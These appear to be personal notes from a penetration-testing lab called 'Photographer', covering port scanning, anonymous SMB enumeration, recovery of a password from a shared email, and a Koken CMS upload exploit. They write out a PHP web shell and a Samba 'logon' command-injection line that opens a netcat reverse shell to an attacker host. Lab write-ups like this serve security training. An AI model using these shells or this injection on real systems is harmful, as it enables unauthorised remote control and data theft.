# Photographer lab - Notes

## Target Details
```
http://192.168.119.76/
```

## Nmap Scanning 
```
Host is up (0.22s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt
```

## Attacking smb client
```
https://docs.centrify.com/Content/zint-samba/ConfigurationUNIXAccess.htm


Connecting to the SMB ip address

smbclient -N -L //192.168.119.76
-L  listing the shares present
-N  accessing without password


Using smb map
smbmap -H "ipaddrr"
```

Samba shares present
```

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            PHOTOGRAPHER

```

Accessing a particular samba share
```
smbclient -N //ip/sharename
smbclient -N //192.168.119.76/sambashare
```

Files found
```
  mailsent.txt                    
  wordpress.bkp.zip       
```

Downloading files from smb
```
get filename.txt
get mailsent.txt
```


smb reverseshell
```
logon “/=`nc 192.168.49.119 4444 -e /bin/bash`"
nc -vvlp 4444
```


Contents of files found
```
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit
Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```


Credentials
```
username : daisa@photographer.com
password : babygirl
```

Exploiting koken
```
https://www.exploit-db.com/exploits/48706
echo "<?php system(\$_GET['cmd']);?>" > image.php.jpg
```
